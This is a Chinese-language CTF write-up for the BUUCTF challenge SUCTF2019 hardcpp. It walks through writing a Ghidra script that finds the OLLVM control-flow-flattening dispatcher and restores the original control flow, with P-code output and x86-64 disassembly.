              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>18 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu097-suctf2019hardcpp"><a class="markdownIt-Anchor" href="#buu097-suctf2019hardcpp"></a> buu097-[SUCTF2019]hardcpp</h1>
<p>这是一个简单的C++程序，但带有大量的控制流平坦化混淆。下面我将从头开始编写用于解决此类混淆问题的Ghidra脚本作为学习。</p>
<p>控制流平坦化中使用一个非常重要的值作为分发器。通常是以这个值为基础将控制流进行拆分，最终形成一个大型的switch语句。如一开始设置分发器为0x12345678，执行某些操作后再修改其值为0x87654321，随后重新进入循环并在switch中寻找该项。</p>
<p>使用静态分析方式对控制流平坦化混淆的代码进行解混淆的方式称为静态还原。静态还原的首要任务就是通过静态分析找到分发器是什么。好在控制流平坦化中的分发器一般都较为明显。下面将参考多篇资料完成本Ghidra脚本的编写。考虑使用Ghidra而不是其他静态反汇编工具主要是考虑到Ghidra完全开源，能够较为方便地查找相关的API。</p>
<p>主要参考资料：<a target="_blank" rel="noopener" href="https://rk700.github.io/2020/08/03/ghidra-ollvm-deobfuscation/">资料</a></p>
<p>笔者使用Intellij Idea进行开发，为了让Intellij Idea能够为我们进行代码补全工作，我们首先需要运行Ghidra根目录下/support/buildGhidraJar.bat脚本，运行完成后/support目录下将新增一个Ghidra.jar文件。在Intellij Idea中选择文件-&gt;项目结构-&gt;模块，导入该jar文件即可。</p>
<p>要开发的脚本预计需要实现以下功能：</p>
<ul>
<li>传入两个参数作为函数地址，指向要进行静态分析的函数以及分发器初始化指令。</li>
<li>通过静态分析获取程序的执行流，并恢复正常的代码逻辑。</li>
</ul>
<p>考虑到一个函数中可能有多个分发器，因此全部依靠脚本本身查找可能不是那么准确，因此暂时先由用户指定。</p>
<p>下面，我们来具体分析一下应该如何恢复控制流。</p>
<h2 id="状态变量"><a class="markdownIt-Anchor" href="#状态变量"></a> 状态变量</h2>
<p>现在，我们已经知道了分发器初始化的地址，通过这个地址对应的指令，我们可以提取该指令的p-code。对于初始化指令，其一定包含一个将常数COPY至某个VarNode的p-code，但这个VarNode并不一定是最终完成赋值操作的VarNode，因此我们还需要对这个VarNode进行跟踪，看看这个常数值通过可能的多次COPY后最终到达何处，即——<font color=yellow>我们要找到保存分发器的VarNode</font>。</p>
<p>在本题的main函数中，初始化分发器的地址为0x40086C，通过Ghidra反汇编可知其中并没有多于的赋值操作，因此上面的trace环节将直接从COPY到达STORE后结束。跟踪到这个常量最终将会被保存到ram($U3200:8)中，也就是RBP-0x9C处：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$U3200:8 = INT_ADD RBP, 0xffffffffffffff6c:8</span><br><span class="line">$U5800:4 = COPY 0x703ff685:4</span><br><span class="line">STORE ram($U3200:8), $U5800:4</span><br></pre></td></tr></table></figure>
<p>但上面的三行代码不能直接被我们拿来进行分析。这些代码是<font color=yellow>P-code Micro code</font>，并不是能够直接执行的P-code，我们还需要对其进行分析生成AST（抽象语法树），将这些P-code连接到一个AST中才能使用。我们使用的实际上是已经经过分析的高级P-code。</p>
<p>经过实验室高人指点，我写出了下面的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ollvm_solver</span> <span class="keyword">extends</span> <span class="title class_">GhidraScript</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DecompInterface decompiler;</span><br><span class="line">    <span class="keyword">private</span> Function func;</span><br><span class="line">    <span class="keyword">private</span> Address init_addr;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ollvmSolverException为自定义异常</span></span><br><span class="line">        <span class="comment">// 构建一个反编译器，这一步至关重要必须完成</span></span><br><span class="line">        <span class="comment">// 如果直接从Instruction获取p-code，那么只能获取上面的micro code</span></span><br><span class="line">        <span class="comment">// 因为没有对整个函数进行反编译分析，也就无法获取AST</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.buildDecompiler(currentProgram);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ollvmSolverException e) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="literal">null</span>, e.getMessage(), <span class="string">&quot;Error while building decompiler&quot;</span>, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取必要参数</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                getArgs(currentProgram);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> ( ollvmSolverException e )&#123;</span><br><span class="line">                JOptionPane.showMessageDialog(<span class="literal">null</span>, e.getMessage(), <span class="string">&quot;Argument error&quot;</span>, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用反编译器进行分析，获取带有PcodeOpAST的HighFunction实例</span></span><br><span class="line">        HighFunction hFunction;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            hFunction = <span class="built_in">this</span>.decompileFunction();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ollvmSolverException e) &#123;</span><br><span class="line">            JOptionPane.showMessageDialog(<span class="literal">null</span>, e.getMessage(), <span class="string">&quot;Decompile error&quot;</span>, JOptionPane.ERROR_MESSAGE);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断分发器初始化指令的合法性，如果不含有将常数COPY至VarNode的p-code，</span></span><br><span class="line">        <span class="comment">// 则该指令一定不是分发器指令，报错</span></span><br><span class="line">        Iterator&lt;PcodeOpAST&gt; ops = hFunction.getPcodeOps(<span class="built_in">this</span>.init_addr);</span><br><span class="line">        <span class="type">PcodeOp</span> <span class="variable">copy_pcode</span> <span class="operator">=</span> <span class="literal">null</span>;  <span class="comment">// PcodeOp是PcodeOpAST的父类</span></span><br><span class="line">        <span class="keyword">for</span> (Iterator&lt;PcodeOpAST&gt; it = ops; it.hasNext(); ) &#123;</span><br><span class="line">            <span class="type">PcodeOpAST</span> <span class="variable">op</span> <span class="operator">=</span> it.next();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (op.getOpcode() == PcodeOp.COPY &amp;&amp; op.getInput(<span class="number">0</span>).isConstant()) &#123;</span><br><span class="line">                println(String.format(<span class="string">&quot;Found COPY from const to varnode: %s&quot;</span>, op.toString()));</span><br><span class="line">                copy_pcode = op;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 迭代寻找MULTIEQUAL P-code，MULTIEQUAL P-code的输出即为状态变量的保存位置</span></span><br><span class="line">        <span class="keyword">while</span>(copy_pcode != <span class="literal">null</span> &amp;&amp; copy_pcode.getOpcode() != PcodeOp.MULTIEQUAL) &#123;</span><br><span class="line">            <span class="keyword">if</span>(copy_pcode.getOutput() == <span class="literal">null</span>) &#123;</span><br><span class="line">                println(String.format(<span class="string">&quot;No output found in %s&quot;</span>, copy_pcode));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            copy_pcode = copy_pcode.getOutput().getLoneDescend();</span><br><span class="line">            <span class="keyword">if</span>(copy_pcode == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> OllvmSolverException.ASTLoneDescendantNotFound();</span><br><span class="line">            &#125;</span><br><span class="line">            println(String.format(<span class="string">&quot;Lone descendant found: %s&quot;</span>, copy_pcode));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> copy_pcode != <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Varnode</span> <span class="variable">dispatcher</span> <span class="operator">=</span> copy_pcode.getOutput();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一个简单的界面，用于输入函数与分发器初始化地址</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">getArgs</span><span class="params">(Program program)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">buildDecompiler</span><span class="params">(Program program)</span> <span class="keyword">throws</span> ollvmSolverException &#123;</span><br><span class="line">        <span class="type">DecompInterface</span> <span class="variable">decompInterface</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DecompInterface</span>();</span><br><span class="line">        <span class="type">DecompileOptions</span> <span class="variable">options</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DecompileOptions</span>();</span><br><span class="line">        <span class="type">PluginTool</span> <span class="variable">tool</span> <span class="operator">=</span> state.getTool();</span><br><span class="line">        <span class="keyword">if</span>(tool != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">OptionsService</span> <span class="variable">service</span> <span class="operator">=</span> tool.getService(OptionsService.class);</span><br><span class="line">            <span class="keyword">if</span>(service != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">ToolOptions</span> <span class="variable">opt</span> <span class="operator">=</span> service.getOptions(<span class="string">&quot;Decompiler&quot;</span>);</span><br><span class="line">                options.grabFromToolAndProgram(<span class="literal">null</span>, opt, program);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        decompInterface.setOptions(options);</span><br><span class="line">        decompInterface.toggleCCode(<span class="literal">true</span>);</span><br><span class="line">        decompInterface.toggleSyntaxTree(<span class="literal">true</span>); <span class="comment">// 生成语法树</span></span><br><span class="line">        decompInterface.setSimplificationStyle(<span class="string">&quot;decompile&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.decompiler = decompInterface;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.decompiler.openProgram(currentProgram)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ollvmSolverException.openCurrentProgramException(<span class="built_in">this</span>.decompiler.getLastMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HighFunction <span class="title function_">decompileFunction</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HighFunction</span> <span class="variable">hfunction</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DecompileResults</span> <span class="variable">dRes</span> <span class="operator">=</span> <span class="built_in">this</span>.decompiler.decompileFunction(<span class="built_in">this</span>.func, <span class="built_in">this</span>.decompiler.getOptions().getDefaultTimeout(), getMonitor());</span><br><span class="line">            hfunction = dRes.getHighFunction();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ollvmSolverException.decopmileException(<span class="built_in">this</span>.func, e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hfunction;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输入函数名为main，分发器初始化地址为0x40086C。该脚本的输出结果是：（为方便查看，笔者手动添加了一些换行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">ollvm_solver.java&gt; Running...</span><br><span class="line">ollvm_solver.java&gt; Found COPY from const to varnode: </span><br><span class="line">    (stack, 0xffffffffffffff64, 4) COPY (const, 0x703ff685, 4)</span><br><span class="line">ollvm_solver.java&gt; Lone descendant found: </span><br><span class="line">    (unique, 0x10000661, 4) COPY (stack, 0xffffffffffffff64, 4)</span><br><span class="line">ollvm_solver.java&gt; Lone descendant found: </span><br><span class="line">    (stack, 0xffffffffffffff64, 4) MULTIEQUAL </span><br><span class="line">        (unique, 0x10000661, 4) , </span><br><span class="line">        (unique, 0x10000665, 4) , </span><br><span class="line">        (unique, 0x10000669, 4) , </span><br><span class="line">        (unique, 0x1000066d, 4) , </span><br><span class="line">        (unique, 0x10000671, 4) , </span><br><span class="line">        (unique, 0x10000675, 4) , </span><br><span class="line">        (unique, 0x10000679, 4) , </span><br><span class="line">        (unique, 0x1000067d, 4) , </span><br><span class="line">        (unique, 0x10000681, 4) , </span><br><span class="line">        (unique, 0x10000685, 4) , </span><br><span class="line">        (unique, 0x10000689, 4) , </span><br><span class="line">        (unique, 0x1000068d, 4) , </span><br><span class="line">        (unique, 0x10000691, 4) , </span><br><span class="line">        (unique, 0x10000695, 4) , </span><br><span class="line">        (unique, 0x10000699, 4) , </span><br><span class="line">        (unique, 0x1000069d, 4) , </span><br><span class="line">        (unique, 0x100006a1, 4) , </span><br><span class="line">        (unique, 0x100006a5, 4) , </span><br><span class="line">        (unique, 0x100006a9, 4) , </span><br><span class="line">        (unique, 0x100006ad, 4) , </span><br><span class="line">        (unique, 0x100006b1, 4) , </span><br><span class="line">        (unique, 0x100006b5, 4) , </span><br><span class="line">        (unique, 0x100006b9, 4) , </span><br><span class="line">        (unique, 0x100006bd, 4) , </span><br><span class="line">        (unique, 0x100006c1, 4) , </span><br><span class="line">        (unique, 0x100006c5, 4) , </span><br><span class="line">        (unique, 0x100006c9, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (register, 0x0, 4) , </span><br><span class="line">        (stack, 0xffffffffffffff64, 4)</span><br></pre></td></tr></table></figure>
<p>这个输出是什么意思呢？可以看到最后输出的这条P-code非常长，并且是一条MULTIEQUAL指令。这就是我们要找的指令，而<code>(stack, 0xffffffffffffff64, 4)</code>则是我们要找的保存状态变量的VarNode。</p>
<p>现在有几个很重要的问题：什么是MULTIEQUAL命令？我们为什么要查找这类命令？</p>
<p>在<a target="_blank" rel="noopener" href="https://spinsel.dev/assets/2020-06-17-ghidra-brainfuck-processor-1/ghidra_docs/language_spec/html/additionalpcode.html">Ghidra P-code文档中</a>，我们可以找到MULTIEQUAL的说明：</p>
<blockquote>
<p>此类指令不会在任何“通过汇编语言直接翻译得到的P-code序列”中得到，但在更大的粒度下可能会被各种分析算法添加进P-code序列。<br />
这条指令具有1个输出参数以及至少2个输入参数。指令的意义是从多个可能的输入VarNode中复制值到输出VarNode。由于P-code具有<font color=red>静态单赋值（Static Single Assignment）</font>特性，这类指令为Phi节点。每一个输入都对应一个“流入包含该MULTIEQUAL指令的基本块的控制流路径”。这条指令将多个输入中的其中之一的值复制到输出VarNode，选择的依据是最后执行的控制流路径。所有输入和输出必须有相同大小。</p>
</blockquote>
<p>静态单赋值的意思是：每一个临时变量在整个程序执行时只能被赋值1次，随后作为常量看待。在上面的输出中，以<code>unique</code>开头的所有VarNode指的都是这类临时变量。在SSA的基础上，我们通过获取该基本块执行之前执行的路径，可以完全确定MULTIEQUAL应该将哪一个变量作为输入。这个结论的理论证明需要用到程序分析课程的相关专业知识，笔者没有学过，这里略过。</p>
<p>有了上面的结论之后，我们就可以完成下面的工作：分配器初始化时，必然会将某个VarNode保存到状态变量，即COPY指令的输入经过可能的多次复制后一定会走到MULTIEQUAL指令。我们只需要查找COPY指令的输出被哪一条指令用作输入，再查看那条指令的输出最终流向哪里，这样就找到了一条完整的数据流，与控制流路径相对应，最终必然能够找到MULTIEQUAL。简而言之，<font color=red>MULTIEQUAL指令需要在AST中从后向前看，而我们则在AST中从前向后查找。</font>Ghidra正好提供了此类API：<code>getLoneDescend</code>——查找将该VarNode作为输入的唯一一个P-code指令。</p>
<h2 id="常量值与基本块的对应关系"><a class="markdownIt-Anchor" href="#常量值与基本块的对应关系"></a> 常量值与基本块的对应关系</h2>
<p>在本题的反汇编C语言代码中，我们可以看到很多这样的结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span>(状态变量==某常数)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(状态变量==某常数)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于第一个while循环，其由至少2个基本块组成，前面是正常的逻辑，其中可能包括正常逻辑的多个基本块，最后以一个条件跳转结束。如果条件满足，则跳转到仅含有break的小基本块。</p>
<p>对于第二个if语句，其同样应该由至少2个基本块组成，前面的判断条件是一个基本块，如果条件满足则跳转到正常逻辑的基本块组中。</p>
<p>上面两种形式有共同的特点，即包含逻辑判断的基本块都应以CBRANCH（条件跳转）指令作为结尾，且判断条件都与状态变量有关。我们可以遍历函数中的所有基本块并筛选出满足这两个特点的基本块，再通过获取跳转的目标基本块，即可确认状态变量的不同值对应于哪些正常逻辑的基本块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(register, 0x206, 1) INT_EQUAL (stack, 0xffffffffffffff64, 4) , (const, 0x703ff685, 4)</span><br><span class="line">---  CBRANCH (ram, 0x400bb0, 1) , (register, 0x206, 1)</span><br></pre></td></tr></table></figure>
<p>上面的基本块就是一个典型的OLLVM块，只进行了一个相等的判断，随后就是CBRANCH。Ghidra有获取P-code基本块最后一条指令的API，有获取后继节点的<code>getLoneDescend</code>、<code>getDescendants</code>，同样也有获取前趋结点的API——<code>getDef</code>，即获取定义一个VarNode的P-code指令。通过这些API，我们就能够获取跳转目的基本块与常量值的对应关系。可以使用一个三元组表示：目的基本块、常量、判断关系（相等、不等、小于等关系）</p>
<h2 id="状态变量更新"><a class="markdownIt-Anchor" href="#状态变量更新"></a> 状态变量更新</h2>
<p>除了获取上面的常量与基本块的对应关系外，我们还需要获取状态变量的更新位置，有了这两个信息，我们就可以将控制流串联起来，才能够对控制流进行优化。</p>
<p>在程序中，状态变量的更新可能会经历多个VarNode的中转，因此脚本中应该通过递归的方式进行更新的查找。具体而言，我们通过状态变量的MULTIEQUAL指令能够获取到所有直接复制值到状态变量的VarNode，这里笔者称为“上家”。但是上家可能并不是常数，而是寄存器值、内存值等，那么此时就还需要寻找这些值的“上家”，直到找到将常数赋值给VarNode的p-code为止。</p>
<p><img src="./state_var_const_data_flow.png" alt="" /></p>
<h2 id="还原控制流"><a class="markdownIt-Anchor" href="#还原控制流"></a> 还原控制流</h2>
<p>基于上面获取的两组信息，我们即可完成对控制流的还原。但在此之前，我们还需要搞清楚还原的具体方法。</p>
<p>要了解如何还原，首先就需要弄清楚如何混淆。</p>
<p>如果需要将原代码逻辑的一个基本块拆分为多个基本块，则混淆后，每个基本块都应该有一个状态变量的赋值，并需要通过直接跳转回到主分配器，之后通过状态变量的值决定下一个要执行的基本块。</p>
<p>而如果原代码中包含if条件分支，则在处理上有几种可能性，如下图所示。将分支条件成立或不成立时的目标基本块替换为添加状态变量赋值的基本块，带有真正逻辑的基本块在随后回到主分配器后跳转。简而言之，就是要让if条件满足于不满足时状态变量的值不同。</p>
<p><img src="./if_branch_obfuscation.png" alt="" /></p>
<p>通过上面的分析，我们就可以将需要处理的基本块分为2种看待。第一种是无条件跳转，即原代码逻辑没有分支；第二种是有条件跳转，即原代码逻辑有分支。</p>
<p>对于无条件跳转，此类基本块一定带有状态变量的更新，只有这样才能在下一次到达分配器时跳转到其他的基本块。如果该基本块A中包含将状态变量赋值为a的指令，那么下一个基本块的执行条件就是状态变量为a，找到一个基本块，其判断状态变量为a时跳转到基本块B，则可判定B为A的后继。</p>
<p>对于有条件跳转，我们需要确认条件满足时和不满足时，下一次判断状态变量的值时状态变量的值是多少。因此不能仅仅看有条件跳转的基本块A，还应该看到这个块引出的两个目标基本块Atrue和Afalse。如果引出的基本块B（Atrue或Afalse）没有对状态变量重新赋值，那么该路径使用的状态变量即为A中赋的值，否则如果重新赋值了，那么后续判断使用的可能就是这个新赋的值。当然有的时候B后面接着的基本块还有可能进行重新赋值，就比如原代码逻辑中存在<code>&quot;if&quot;-&quot;else if&quot;-&quot;else&quot;</code>的条件分支时，OLLVM可能就会将三个基本块赋3个值。对于此类代码逻辑，我们则必须递归进行处理，确定所有分支的目标基本块才能进行后续的修复操作。但经过笔者观察发现，对于此类代码逻辑，OLLVM更倾向于全部拆开，产生两个左边的执行流结构，而不会产生右边的结构。</p>
<p><img src="./multiple_cond.png" alt="" /></p>
<p>综上所述，我们在还原控制流前需要保存的链接信息包含<strong>若干个二元组</strong>和<strong>若干个三元组</strong>。二元组用于保存无条件分支基本块及其后继，三元组用于保存有条件分支基本块及其两个后继。</p>
<h2 id="程序修复"><a class="markdownIt-Anchor" href="#程序修复"></a> 程序修复</h2>
<p>下面介绍的程序修复方案只考虑x86-64架构。</p>
<p>对于无条件跳转，我们只需要将跳转目标改为真实的后继即可。</p>
<p>对于有条件跳转则要复杂一些。在x86-64中，OLLVM常会使用CMOVXX系指令完成条件分支的两个赋值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax, 0x12345678</span><br><span class="line">mov ecx, 0x87654321</span><br><span class="line">... (条件判断)</span><br><span class="line">cmoveq eax, ecx</span><br><span class="line">mov state_var, eax</span><br><span class="line">jmp dispatcher_block</span><br></pre></td></tr></table></figure>
<p>如上面的代码所示，条件判断是原代码逻辑，如果条件成立则状态变量的值为0x87654321，否则为0x12345678。我们需要再最后三条指令上做文章，需修改为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jeq block_a ; condition true</span><br><span class="line">jmp block_b ; condition false</span><br></pre></td></tr></table></figure>
<h2 id="进一步调试"><a class="markdownIt-Anchor" href="#进一步调试"></a> 进一步调试</h2>
<p>经过上面漫长的研究与摸索，我们总算是完成了整个流程，但当patch结果显示后，结果却并不尽如人意。经过分析发现，代码中存在这样的东西：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400876 8B 85 6C FF FF FF             mov     eax, [rbp+var_94]</span><br><span class="line">.text:000000000040087C 89 C1                         mov     ecx, eax</span><br><span class="line">.text:000000000040087E 81 E9 E6 E2 64 83             sub     ecx, 8364E2E6h</span><br><span class="line">.text:0000000000400884 89 85 5C FF FF FF             mov     [rbp+var_A4], eax</span><br><span class="line">.text:000000000040088A 89 8D 58 FF FF FF             mov     [rbp+var_A8], ecx</span><br><span class="line">.text:0000000000400890 0F 84 3D 05 00 00             jz      loc_400DD3</span><br><span class="line">.text:0000000000400890</span><br><span class="line">.text:0000000000400896 E9 00 00 00 00                jmp     $+5</span><br><span class="line">.text:0000000000400896</span><br><span class="line">.text:000000000040089B                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040089B</span><br><span class="line">.text:000000000040089B                               loc_40089B:                             ; CODE XREF: main+B6↑j</span><br><span class="line">.text:000000000040089B 8B 85 5C FF FF FF             mov     eax, [rbp+var_A4]</span><br><span class="line">.text:00000000004008A1 2D 07 CD 56 8B                sub     eax, 8B56CD07h</span><br><span class="line">.text:00000000004008A6 89 85 54 FF FF FF             mov     [rbp+var_AC], eax</span><br><span class="line">.text:00000000004008AC 0F 84 B0 04 00 00             jz      loc_400D62</span><br><span class="line">.text:00000000004008AC</span><br><span class="line">.text:00000000004008B2 E9 00 00 00 00                jmp     $+5</span><br></pre></td></tr></table></figure>
<p>可以看到，下面一个基本块并不是对状态变量<code>[rbp+var_94]</code>判断，而是将这个值复制到了<code>[rbp+var_A4]</code>之后再判断。这两个基本块都是分配器的一部分，但是原本的状态变量被复制了一份。这种实际上是不会有影响的，Ghidra会将其优化掉，不会导致无法找全所有对应关系的问题。</p>
